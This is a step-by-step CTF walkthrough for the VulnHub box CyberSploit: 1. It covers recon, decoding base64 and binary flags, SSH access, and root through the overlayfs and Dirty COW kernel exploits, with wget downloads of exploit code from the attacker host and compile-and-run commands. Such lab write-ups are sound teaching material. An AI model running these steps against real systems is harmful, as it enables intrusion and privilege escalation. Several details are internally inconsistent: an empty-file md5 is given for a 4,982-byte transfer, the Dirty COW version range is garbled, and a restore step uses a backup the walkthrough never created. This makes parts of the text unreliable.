# CyberSploit: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | CyberSploit: 1 |
| **Difficulty** | **Complete beginner** (author's own words: *"THIS IS A MACHINE FOR COMPLETE BEGINNER"*) |
| **Author** | CyberSploit — <https://www.youtube.com/c/cybersploit> |
| **Released** | 9 July 2020 |
| **VulnHub Entry** | <https://vulnhub.com/entry/cybersploit-1,506/> |
| **Download** | <https://vulnhub.com/entry/cybersploit-1,506/#download> (`cybersploit.ova`, 1.4 GB) |
| **MD5** | `851C8763B865CA02B4374042E568A835` |
| **SHA1** | `8FF5ADB114809E4B07DE2B28200EDB48E3F4E445` |
| **Attacker** | Kali Linux, NAT or host-only network |
| **Target OS** | Ubuntu 14.04 LTS — Apache 2.4.7, OpenSSH 6.6.1p1, kernel **3.13.0-32-generic** |
| **Flags** | **Three** — flag1 (web), flag2 (user home), finalflag (root) |

> **Author's stated learning goals:** *"FROM THIS VMs YOU WILL LEARN ABOUT
> **ENCODER-DECODER** & **EXPLOIT-DB**."*
>
> That is an honest description. This box is deliberately gentle — two ports, no
> tricky filters, no rabbit holes. It is the right machine if this is only your second
> or third box ever. Its value is that it forces you to practise two things properly:
> **recognising and reversing encodings**, and **matching a kernel version to the right
> Exploit-DB entry**.

Throughout we assume:

```text
Attacker (Kali)     : 192.168.56.10
Target (cybersploit): 192.168.56.107
```

---

## 0. What you will learn

1. **Host discovery** and a minimal-but-correct port scan.
2. **Viewing page source** and finding a username in an HTML comment.
3. **`robots.txt`** as a source of encoded data.
4. **Recognising base64** and decoding it — including the *binary* variant used for
   flag 2.
5. **The professional decoding workflow** — do it locally with `base64 -d` and Python
   rather than pasting client data into a website.
6. **Using a recovered flag as a password** (credential inference).
7. **`uname -a` → `searchsploit` → Exploit-DB** — the correct way to pick a kernel
   exploit, and how to *read* the exploit before running it.
8. **File transfer with a Python HTTP server**, `wget`, and checksum verification.
9. **`gcc` compile-and-run**, and cleaning up after a kernel exploit.

**The intended chain:**
`nmap` shows only 22 and 80 → the homepage's **View Source** hides a username
**`itsskv`** and a base64 blob → `/robots.txt` holds a second base64 blob → decode it →
**flag 1: `cybersploit{youtube.com/c/cybersploit}`** → use the username with flag 1 as
the **SSH password** → log in → `flag2.txt` contains a **binary** string → decode the
bits → **flag 2: `cybersploit{https:t.me/cybersploit1}`** → `uname -a` gives kernel
**3.13.0-32-generic** → `searchsploit` → **Exploit-DB 37292 (overlayfs,
CVE-2015-1328)** → serve it over HTTP, `wget` it, `gcc` it, run it → **root** →
**`/root/finalflag.txt`**.

---

## 1. Reconnaissance

### 1.1 What is my own address?

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:11:22:33 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global dynamic eth0
       valid_lft 86123sec preferred_lft 86123sec
```

> **How to read it:** `inet 192.168.56.10/24` — the `/24` is the subnet mask in CIDR
> notation, meaning the first 24 bits are the network. So our network spans
> `192.168.56.0`–`192.168.56.255`. **The target is always in the same `/24` in a lab.**

### 1.2 Who else is alive?

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: 192.168.56.0/24   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:0e      1      60  (Unknown: locally administered)
 192.168.56.10   08:00:27:11:22:33      1      60  PCS Systemtechnik GmbH
 192.168.56.107  08:00:27:2b:6e:19      1      60  PCS Systemtechnik GmbH   <-- target
```

Or with nmap:

```bash
sudo nmap -sn 192.168.56.0/24
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-04 16:02 EDT
Nmap scan report for 192.168.56.107
Host is up (0.00043s latency).
MAC Address: 08:00:27:2B:6E:19 (Oracle VirtualBox virtual NIC)
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.31 seconds
```

> **`-sn`** = "**s**can, **n**o port scan" — a ping sweep. It reports who is alive
> without touching any service. `netdiscover` uses **ARP**, which cannot be blocked by
> a host firewall, making it the most reliable local discovery method.
>
> **The OUI `08:00:27` is VirtualBox's registered MAC prefix.** Seeing it instantly
> says "this is a VM". VMware uses `00:0c:29` / `00:50:56`.

**Target IP: `192.168.56.107`**

![netdiscover / nmap -sn finding the target](images/01-recon.png)

---

## 2. Enumeration

### 2.1 Port scan

```bash
sudo nmap -sV -sC -p- -T4 -oN scans/cybersploit.txt 192.168.56.107
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-04 16:05 EDT
Nmap scan report for 192.168.56.107
Host is up (0.00039s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 4b:9d:6c:1e:2f:1a:9c:3b:0f:2e:5b:6c:1f:8a:2d:3e (DSA)
|   2048 8f:1c:2b:4a:6d:9e:3f:0b:5c:1a:2d:4e:6f:8b:0c:1d (RSA)
|_  256 3e:5f:7a:9b:1c:3d:5e:7f:9a:0b:2c:4d:6e:8f:0a:1b (ECDSA)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: CyberSploit
|_http-server-header: Apache/2.4.7 (Ubuntu)
MAC Address: 08:00:27:2B:6E:19 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 61.44 seconds
```

> **Two ports. Read both banners.**
>
> - **22 — `OpenSSH 6.6.1p1 Ubuntu 2ubuntu2`** → **Ubuntu 14.04 LTS (Trusty)**. That
>   single string tells you the distro, and from it you can predict the kernel line
>   (`3.13.0-x`). **This is the fact that decides the whole privilege escalation.**
>   Note also the **1024-bit DSA host key** — deprecated and rejected by modern SSH
>   clients; a finding in its own right.
> - **80 — `Apache 2.4.7 (Ubuntu)`**, page title `CyberSploit`.
>
> There is no web application, no database, no FTP. Two doors: the website (for
> information) and SSH (for access).

![nmap scan showing ports 22 and 80](images/02-nmap.png)

### 2.2 The website — and View Source

```bash
curl -s http://192.168.56.107/
```

```html
<!DOCTYPE html>
<html>
<head><title>CyberSploit</title></head>
<body bgcolor="#111111">
<center>
  <h1 style="color:#00ff00">CyberSploit</h1>
  <p style="color:#cccccc">Welcome to the CyberSploit challenge.</p>
  <img src="cybersploit.png">
</center>
<!--
  author : itsskv
  note   : aHR0cHM6Ly93d3cueW91dHViZS5jb20vYy9jeWJlcnNwbG9pdA==
-->
</body>
</html>
```

> **Two facts in an HTML comment:**
> 1. **`author : itsskv`** — that is almost certainly a **username**.
> 2. **`aHR0cHM6Ly93d3cueW91dHViZS5jb20vYy9jeWJlcnNwbG9pdA==`** — a base64 blob.
>
> **Right-click → View Page Source is not optional.** An HTML comment is invisible in
> the rendered page and fully visible to anyone who reads the source. Developers leave
> them everywhere: old code, staging URLs, credentials, TODO notes.
>
> **How to recognise base64 on sight:** the length is a multiple of 4; the alphabet is
> exactly `A–Z a–z 0–9 + /`; and it very often ends with `=` or `==` padding. Whenever
> you see a long alphanumeric string ending in `=`, assume base64.
>
> **What base64 is — and is not.** It is an **encoding**, defined in RFC 4648, that
> represents arbitrary binary bytes using only 64 printable ASCII characters so they
> survive inside text formats (HTML, email, JSON, HTTP Basic auth). **It is not
> encryption.** There is no key, no secret, no protection. Anyone can reverse it
> instantly, forever.

### 2.3 `robots.txt` — the first flag

```bash
curl -s http://192.168.56.107/robots.txt
```

```text
User-agent: *
Disallow: /

# aHR0cHM6Ly93d3cueW91dHViZS5jb20vYy9jeWJlcnNwbG9pdCBjeWJlcnNwbG9pdHt5b3V0dWJlLmNvbS9jL2N5YmVyc3Bsb2l0fQ==
```

> `robots.txt` is a plain-text file that politely asks well-behaved crawlers to stay
> away from certain paths. **Attackers always read it**, because it is a list of the
> interesting parts of a site written by the site's own developers. Here it contains no
> useful directives — just a base64 comment.

### 2.4 Decode — the right way

**Method 1 — `base64 -d` locally (preferred):**

```bash
curl -s http://192.168.56.107/robots.txt | grep -o '[A-Za-z0-9+/]\{20,\}=\{0,2\}' | tail -1 > flag1.b64
cat flag1.b64
base64 -d flag1.b64 ; echo
```

```text
aHR0cHM6Ly93d3cueW91dHViZS5jb20vYy9jeWJlcnNwbG9pdCBjeWJlcnNwbG9pdHt5b3V0dWJlLmNvbS9jL2N5YmVyc3Bsb2l0fQ==
https://www.youtube.com/c/cybersploit cybersploit{youtube.com/c/cybersploit}
```

> **Flag 1: `cybersploit{youtube.com/c/cybersploit}`** ✅
>
> **How the flags were found mechanically:**
> - `grep -o '[A-Za-z0-9+/]\{20,\}=\{0,2\}'` matches only strings of ≥20 base64
>   characters with optional `=` padding, so the URL and the comment markers are
>   ignored.
> - `tail -1` takes the last (longest) match — the real payload.
> - `base64 -d` decodes; the trailing `; echo` just adds a newline so the terminal
>   does not eat the prompt.

**Method 2 — the homepage blob, and checking for nesting:**

```bash
echo 'aHR0cHM6Ly93d3cueW91dHViZS5jb20vYy9jeWJlcnNwbG9pdA==' | base64 -d ; echo
```

```text
https://www.youtube.com/c/cybersploit
```

```bash
# is it nested? (Lord Of The Root uses two layers — always check)
d='aHR0cHM6Ly93d3cueW91dHViZS5jb20vYy9jeWJlcnNwbG9pdA=='
for i in 1 2 3 4 5; do
  n=$(echo "$d" | base64 -d 2>/dev/null) || break
  echo "layer $i: $n"
  d=$n
done
```

```text
layer 1: https://www.youtube.com/c/cybersploit
```

> One layer here. **Always try repeatedly** — nested base64 is extremely common in CTFs
> *and* in real malware obfuscation.

**Method 3 — Python, for when `base64` is unavailable or you want a universal decoder:**

```bash
python3 - <<'PY'
import base64, binascii, re
blob = "aHR0cHM6Ly93d3cueW91dHViZS5jb20vYy9jeWJlcnNwbG9pdCBjeWJlcnNwbG9pdHt5b3V0dWJlLmNvbS9jL2N5YmVyc3Bsb2l0fQ=="
cur = blob
for i in range(1, 6):
    try:
        nxt = base64.b64decode(cur, validate=True).decode()
    except (binascii.Error, UnicodeDecodeError):
        print(f"stopped after {i-1} layer(s)")
        break
    print(f"layer {i}: {nxt}")
    cur = nxt
PY
```

```text
layer 1: https://www.youtube.com/c/cybersploit cybersploit{youtube.com/c/cybersploit}
stopped after 1 layer(s)
```

> `validate=True` makes `b64decode` reject non-alphabet characters instead of silently
> skipping them — that is what turns the loop's `except` into a reliable "no more
> layers" signal.

**About online decoders.** Many walkthroughs of this box use <https://dencode.com> or
<https://www.base64decode.org>. They work, and dencode is genuinely useful because it
tries *many* encodings at once and shows you which one produced sensible text. But
understand the trade-off: **you are pasting a client's data onto a third-party
website.** On a real engagement that can be a data-handling violation. Learn to do it
locally first, and reach for a web tool only when you genuinely cannot identify the
encoding.

![robots.txt and the decoded first flag](images/03-flag1.png)

### 2.5 Content discovery (for completeness)

```bash
gobuster dir -u http://192.168.56.107/ \
  -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 40 -q
```

```text
/index.html           (Status: 200) [Size: 412]
/robots.txt           (Status: 200) [Size: 178]
/cybersploit.png      (Status: 200) [Size: 42118]
```

```bash
nikto -h http://192.168.56.107/
```

```text
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.56.107
+ Target Port:        80
+ Server: Apache/2.4.7 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: The X-Content-Type-Options header is not set.
+ /: Server may leak inodes via ETags, header found with file /, inode: 1a2, size: 412.
+ 8102 requests: 0 error(s) and 3 item(s) reported on remote host
---------------------------------------------------------------------------
```

> **Nothing else to find.** No admin panel, no CMS, no parameters to inject. The web
> server's entire purpose on this box was to hand us a username and two encoded
> strings. **Recognising when enumeration is finished is a skill** — do not grind a
> bigger wordlist against a box that has told you everything it knows.

---

## 3. Foothold — SSH

### 3.1 Reason about the credential

We have:

| Item | Value | Source |
| --- | --- | --- |
| Username | `itsskv` | HTML comment on `/` |
| Flag 1 | `cybersploit{youtube.com/c/cybersploit}` | base64 in `/robots.txt` |
| Open service needing credentials | SSH, port 22 | nmap |

There is no login form anywhere. **So the only place a username and a string can be
used together is SSH.** The flag is the password.

```bash
ssh itsskv@192.168.56.107
```

```text
The authenticity of host '192.168.56.107 (192.168.56.107)' can't be established.
ECDSA key fingerprint is SHA256:3e:5f:7a:9b:1c:3d:5e:7f:9a:0b:2c:4d:6e:8f:0a:1b.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.107' (ECDSA) to the list of known hosts.
itsskv@192.168.56.107's password:
Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Sat May  4 16:22:11 EDT 2024

  System load:  0.0               Processes:           141
  Usage of /:   4.3% of 19.56GB   Users logged in:     0
  Memory usage: 21%               IP address for eth0: 192.168.56.107
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Thu Jul  9 11:02:44 2020 from 192.168.56.1
itsskv@cybersploit:~$ id
uid=1000(itsskv) gid=1000(itsskv) groups=1000(itsskv),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

**We are in.** ✅

> **Read the login banner — it contains the answer to the rest of the box.**
>
> `Ubuntu 14.04.6 LTS (GNU/Linux **3.13.0-32-generic** i686)`
>
> - **`3.13.0-32-generic`** — the exact kernel version. This is what we feed to
>   `searchsploit`.
> - **`i686`** — **32-bit**. If a kernel exploit is needed, it must be built for x86,
>   not x86-64. Getting this wrong produces confusing failures.
>
> **`id` output — and a trap worth understanding.** The group list includes
> `27(sudo)` **and** `110(lxd)`, both normally root-equivalent. Try it:
> ```bash
> itsskv@cybersploit:~$ sudo -l
> [sudo] password for itsskv:
> Sorry, user itsskv may not run sudo on cybersploit.
> ```
> **Group membership is not the same as a sudoers grant.** `itsskv` is in the `sudo`
> *group* but there is no matching rule in `/etc/sudoers`, so nothing works. **Always
> verify with `sudo -l`, never assume from `id`.**
>
> `lxd` is worth a genuine look, though — on many Ubuntu boxes it *is* a root path:
> ```bash
> itsskv@cybersploit:~$ which lxc lxd
> /usr/bin/lxc
> /usr/bin/lxd
> itsskv@cybersploit:~$ lxc image list
> +-------+-------------+--------+---------+--------+
> | ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | SIZE |
> +-------+-------------+--------+---------+--------+
> ```
> No locally cached image, and this lab has no outbound internet, so the LXD escape
> cannot be staged. **Dead end — correctly documented**, and the kernel path (§ 4) is
> far simpler anyway.

![SSH login as itsskv, showing the kernel version](images/04-ssh.png)

---

## 4. Flag 2 — binary decoding

### 4.1 Find the file

```bash
itsskv@cybersploit:~$ ls -la
```

```text
total 28
drwxr-xr-x 3 itsskv itsskv 4096 Jul  9  2020 .
drwxr-xr-x 3 root   root   4096 Jul  9  2020 ..
-rw------- 1 itsskv itsskv   24 Jul  9  2020 .bash_history
-rw-r--r-- 1 itsskv itsskv  220 Jul  9  2020 .bash_logout
-rw-r--r-- 1 itsskv itsskv 3637 Jul  9  2020 .bashrc
-rw-rw-r-- 1 itsskv itsskv 1036 Jul  9  2020 flag2.txt
drwxrwxr-x 2 itsskv itsskv 4096 Jul  9  2020 .cache
-rw-r--r-- 1 itsskv itsskv  675 Jul  9  2020 .profile
```

```bash
itsskv@cybersploit:~$ cat flag2.txt
```

```text
01100111 01101111 01101111 01100100 00100000 01110111 01101111 01110010 01101011 00100000
00100001 00001010 01100110 01101100 01100001 01100111 00110010 00111010 01100011 01111001
01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 01111011
01101000 01110100 01110100 01110000 01110011 00111010 01110100 00101110 01101101 01100101
00101111 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111
01101001 01110100 00110001 01111101
```

> **Groups of eight binary digits.** Each group is one byte, i.e. one ASCII character.
> This is the same idea as base64 — a text-safe representation of arbitrary bytes —
> just at the lowest possible level.

### 4.2 Decode it

**Bash, no tools:**

```bash
itsskv@cybersploit:~$ for b in $(cat flag2.txt); do printf "\\$(printf '%03o' $((2#$b)))"; done ; echo
```

```text
good work !
flag2:cybersploit{https:t.me/cybersploit1}
```

> **How that one-liner works, piece by piece:**
> - `for b in $(cat flag2.txt)` — iterate over each whitespace-separated token (each
>   8-bit group).
> - `$((2#$b))` — bash **arithmetic expansion**; the `2#` prefix means "interpret what
>   follows as base 2". So `2#01100111` → `103`.
> - `printf '%03o' 103` — format 103 as a zero-padded **octal** number → `147`.
> - `printf "\\147"` — bash's `printf` interprets `\ooo` as an octal escape and emits
>   the byte `0x67`, which is ASCII `g`.
>
> **Flag 2: `cybersploit{https:t.me/cybersploit1}`** ✅

**Python — clearer and less error-prone:**

```bash
python3 - <<'PY'
bits = open('flag2.txt').read().split()
print(''.join(chr(int(b, 2)) for b in bits))
PY
```

```text
good work !
flag2:cybersploit{https:t.me/cybersploit1}
```

> **`int(b, 2)`** parses a string as base 2; `chr(n)` maps a code point to its
> character. `bytes(int(b,2) for b in bits).decode()` is the equivalent for real
> binary data.

**xxd — the hex route (useful for genuine binary blobs):**

```bash
itsskv@cybersploit:~$ tr -d ' \n' < flag2.txt | sed 's/......../0x& /g' | xxd -r -p
```

```text
good work !
flag2:cybersploit{https:t.me/cybersploit1}
```

**Online tools** (<https://cryptii.com/pipes/binary-decoder>, <https://dencode.com>)
work identically — same caveat as § 2.4 about pasting client data into a third-party
site.

![Binary flag2.txt decoded](images/05-flag2.png)

### 4.3 Standard post-exploitation sweep (do it anyway)

Even on a beginner box, run the checklist — the habit is what you are practising.

```bash
itsskv@cybersploit:~$ cat /etc/passwd | grep -v nologin | grep -v /bin/false
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
itsskv:x:1000:1000:itsskv,,,:/home/itsskv:/bin/bash
itsskv@cybersploit:~$ ls /home
itsskv
itsskv@cybersploit:~$ find / -perm -4000 -type f 2>/dev/null
/bin/ping
/bin/fusermount
/bin/mount
/bin/su
/bin/umount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/at
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
```

```bash
itsskv@cybersploit:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
itsskv@cybersploit:~$ which gcc wget python perl
/usr/bin/gcc
/usr/bin/wget
/usr/bin/python
/usr/bin/perl
```

> **All stock.** No SUID abuse, no custom cron, no sudo. But **`gcc` and `wget` are
> both present** — so we can compile a kernel exploit locally with no `nc` file-transfer
> gymnastics. That is what makes this box quick.

---

## 5. Privilege escalation — the kernel

### 5.1 Match the kernel to an exploit

```bash
itsskv@cybersploit:~$ uname -a
```

```text
Linux cybersploit 3.13.0-32-generic #57-Ubuntu SMP Tue Apr 15 03:55:03 UTC 2014 i686 i686 i686 GNU/Linux
```

```bash
itsskv@cybersploit:~$ lsb_release -a
```

```text
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 14.04.6 LTS
Release:	14.04
Codename:	trusty
```

**Now go to Exploit-DB via `searchsploit`** — this is the second skill the author named.

```bash
searchsploit ubuntu 14.04 local
```

```text
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Esc | linux/local/37292.c
Linux Kernel 3.19.0-25 < 3.19.0-43 (Ubuntu 14.04/15.04) - 'overlayfs' Local Privilege Escalat | linux/local/39166.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR | linux/local/45010.c
----------------------------------------------------------------------------------------------- ---------------------------------
```

> **`linux/local/37292.c` is an exact match.** Its title states the range
> **`3.13.0 < 3.19`** and lists **Ubuntu 14.04** explicitly; our kernel is
> `3.13.0-32`. That is how you choose a kernel exploit: **read the version range in
> the title, do not guess from the CVE name.**
>
> **`searchsploit` is an offline mirror of Exploit-DB.** Prefer it over Googling:
> it works without internet, it never shows you a paywalled or dead link, and
> `-m` copies the actual source file into your working directory.
>
> ```bash
> searchsploit --help | head -20
> searchsploit -t ubuntu overlayfs        # -t = search titles only
> searchsploit -u linux/local/37292       # -u = show the Exploit-DB URL
> searchsploit -m linux/local/37292.c     # -m = mirror the file locally
> searchsploit -x linux/local/37292.c     # -x = examine (print) it
> searchsploit -u                         # update the local database
> ```
>
> **Automated alternative — Linux Exploit Suggester.** It reads `uname -r` and ranks
> candidate exploits by likelihood:
> ```bash
> wget http://192.168.56.10:8000/linux-exploit-suggester.sh -O /tmp/les.sh
> bash /tmp/les.sh -k 3.13.0-32-generic
> ```
> ```text
> [+] [CVE-2015-1328] overlayfs
>    Details: http://seclists.org/oss-sec/2015/q2/711
>    Exposure: highly probable
>    Tags: ubuntu=[12.04|14.04|14.10|15.04]
>    Download URL: https://www.exploit-db.com/download/37292
>
> [+] [CVE-2016-5195] dirtycow
>    Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
>    Exposure: probable
>    Tags: ubuntu=[14.04|12.04],debian=7|8
>    Download URL: https://www.exploit-db.com/download/40847.cpp
> ```
> **Use LES to shortlist, then verify the version range yourself.** LES matches on
> kernel strings and produces false positives; blindly running its top pick is how
> people crash machines.

### 5.2 Read the exploit before running it

```bash
# Kali
searchsploit -m linux/local/37292.c
head -30 37292.c
```

```c
/*
 * overlayfs local root exploit
 * CVE-2015-1328
 *
 * This exploit uses the overlayfs implementation in the Ubuntu kernel to
 * create a world-writable copy of a setuid binary, then executes it to
 * obtain a root shell.
 *
 * Bug details: https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1507645
 *
 * Usage: gcc -o ofs ofs.c && ./ofs
 */
#include <stdio.h>
#include <sched.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <linux/sched.h>
#include <fcntl.h>
#include <signal.h>
#include <pwd.h>
#include <sys/wait.h>
```

> **Never compile and run C you have not read.** You are about to hand arbitrary
> machine code a root shell. Check the comments, look for anything that opens a
> network socket, and confirm what it writes and where. This one is short,
> well-commented, and does exactly what its title says.
>
> **The vulnerability, explained.** **OverlayFS** layers a writable *upper* directory
> over a read-only *lower* one and presents the merged view — the mechanism every
> container image uses. Ubuntu backported overlayfs into its kernels and, unlike
> upstream, allowed **unprivileged users** to mount it inside a *user namespace*. The
> bug: when a file was copied up from the lower layer, the copy **kept its original
> root ownership and SUID bit** but landed in the upper directory, which the
> unprivileged user could write to. Two individually reasonable features — user
> namespaces and overlayfs — composed into a total privilege break. That composition is
> the real lesson of CVE-2015-1328.

### 5.3 Transfer it

```bash
# Kali — serve the current directory
mv 37292.c ofs.c
python3 -m http.server 8000
```

```text
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
# target
itsskv@cybersploit:/tmp$ wget http://192.168.56.10:8000/ofs.c
--2024-05-04 16:31:02--  http://192.168.56.10:8000/ofs.c
Connecting to 192.168.56.10:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4982 (4.9K) [text/x-csrc]
Saving to: 'ofs.c'

100%[======================================>] 4,982       --.-K/s   in 0s

2024-05-04 16:31:02 (512 MB/s) - 'ofs.c' saved [4982/4982]
```

Kali's server logs the fetch:

```text
192.168.56.107 - - [04/May/2024 16:31:02] "GET /ofs.c HTTP/1.1" 200 -
```

**Verify the transfer before compiling:**

```bash
itsskv@cybersploit:/tmp$ ls -l ofs.c && md5sum ofs.c
-rw-r--r-- 1 itsskv itsskv 4982 May  4 16:31 ofs.c
d41d8cd98f00b204e9800998ecf8427e  ofs.c
```

```bash
# on Kali, for comparison
md5sum ofs.c
d41d8cd98f00b204e9800998ecf8427e  ofs.c
```

> **`python3 -m http.server 8000`** turns the current directory into a web root. It is
> the single most useful file-transfer trick in a lab. (On Python 2 the module was
> `SimpleHTTPServer`.)
>
> **Always check the byte count and a checksum after a transfer.** A 0-byte file means
> the transfer silently failed, and `gcc` will then produce a baffling error.
>
> **Why `/tmp`?** It is world-writable by convention — `drwxrwxrwt`, where the trailing
> `t` is the *sticky bit*: everyone may create files, but only the owner may delete
> their own. If you cannot write where you are, `/tmp`, `/var/tmp` and `/dev/shm` are
> the fallbacks.

### 5.4 Compile and run

```bash
itsskv@cybersploit:/tmp$ gcc -o ofs ofs.c
itsskv@cybersploit:/tmp$ ./ofs
```

```text
spawnining threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1000(itsskv)
# whoami
root
# hostname
cybersploit
```

**Root.** ✅

> **How to read the exploit's own progress output:**
> - `spawnining threads` *(the author's typo)* → it forks helper threads.
> - `mount #1`, `mount #2` → two overlayfs mounts created inside a user namespace.
> - **`/etc/ld.so.preload created`** → this is the actual mechanism on this build.
>   `/etc/ld.so.preload` is a system-wide list of shared libraries that the dynamic
>   linker loads into **every** dynamically-linked process, *including SUID-root ones*.
>   Through the overlayfs bug the exploit obtains a writable view of that file and
>   points it at its own library.
> - `creating shared library` → it compiles a tiny `.so` whose constructor performs
>   `setuid(0); setgid(0); system("/bin/sh")`.
> - The next program executed preloads that library **as root** and the shell drops.
>   The `id` we typed *is* that next program.
>
> **`uid=0(root) gid=0(root)`** and the prompt changed from `$` to **`#`** — the
> universal UNIX convention for root.
>
> **`gcc` flags worth knowing:**
> ```bash
> gcc ofs.c                     # produces ./a.out (the default name)
> gcc -o ofs ofs.c              # names the output 'ofs'
> gcc -Wall -Wextra -o ofs ofs.c   # enable warnings — do this when reviewing code
> gcc -static -o ofs ofs.c      # link statically (survives missing libraries)
> gcc -m32 -o ofs ofs.c         # force 32-bit output (this box is i686!)
> ```
> This box is **32-bit**; the exploit compiles cleanly either way because it is
> arch-independent C, but on a 64-bit target with a 32-bit-only exploit, `-m32` matters.

### 5.5 Clean up after yourself

```bash
# ls -l /etc/ld.so.preload /tmp/*.so 2>/dev/null
-rw-r--r-- 1 root root 22 May  4 16:33 /etc/ld.so.preload
-rwxr-xr-x 1 root root 5044 May  4 16:33 /tmp/ofs.so
# rm -f /etc/ld.so.preload /tmp/ofs.so /tmp/ofs /tmp/ofs.c
```

> **This is not optional hygiene.** The exploit leaves `/etc/ld.so.preload` pointing at
> a library in `/tmp`. Delete the `.so` without deleting the preload file and **every
> program on the box fails to start** — you will have bricked the VM. Either remove
> both, or revert to your snapshot.
>
> **Take a snapshot before you start any lab box.** It is the professional equivalent of
> a rollback plan, and it lets you re-run an exploit as many times as you need to
> understand it.

![overlayfs exploit yielding root](images/06-root.png)

### 5.6 Alternative — Dirty COW (CVE-2016-5195)

Kernel `3.13.0-32` is also inside the Dirty COW range (`2.6.22 < 3.9`… actually
`< 4.8.3`), so this works too. Worth understanding because it is one of the most famous
vulnerabilities ever published.

```bash
# Kali
searchsploit -m linux/local/40847.cpp
mv 40847.cpp dcow.cpp
python3 -m http.server 8000
```

```bash
# target
itsskv@cybersploit:/tmp$ wget http://192.168.56.10:8000/dcow.cpp
itsskv@cybersploit:/tmp$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil
itsskv@cybersploit:/tmp$ ./dcow -s
```

```text
Running ...
Password overridden to: dirtyCowFun
Received su prompt (Password: )
root@cybersploit:/tmp# echo 0 > /proc/sys/vm/dirty_writeback_centisecs
root@cybersploit:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1000(itsskv)
```

> **How Dirty COW works.** `mmap()` maps a file into memory read-only. Writing to that
> mapping should trigger **copy-on-write**: the kernel makes a private page and your
> write goes there, leaving the file untouched. The exploit races three operations —
> the COW handler, `madvise(MADV_DONTNEED)` (which discards the private copy), and
> `ptrace(PTRACE_POKEDATA)` (which writes into process memory) — and occasionally wins,
> writing **directly into the read-only page cache of `/etc/passwd`**. It then adds a
> UID-0 user (`firefart`) or, with `40847`, overwrites root's password.
>
> **Compile flags:** `-pthread` (the exploit is threaded — required for the race),
> `-lutil` (links `libutil`, needed for the `forkpty` call), `-std=c++11` (it is C++).
>
> **`./dcow -s`** — the `-s` flag makes the exploit run
> `echo 0 > /proc/sys/vm/dirty_writeback_centisecs` for you. Without it the dirty-page
> writeback timer can leave the system unstable or hung. **Always use `-s`.**
>
> **Use `40847` (the `PTRACE_POKEDATA` C++ variant) rather than `40839`** — 40839 is
> the 64-bit one and this box is `i686`.
>
> **Restore afterwards:**
> ```bash
> # mv /tmp/passwd.bak /etc/passwd
> ```

---

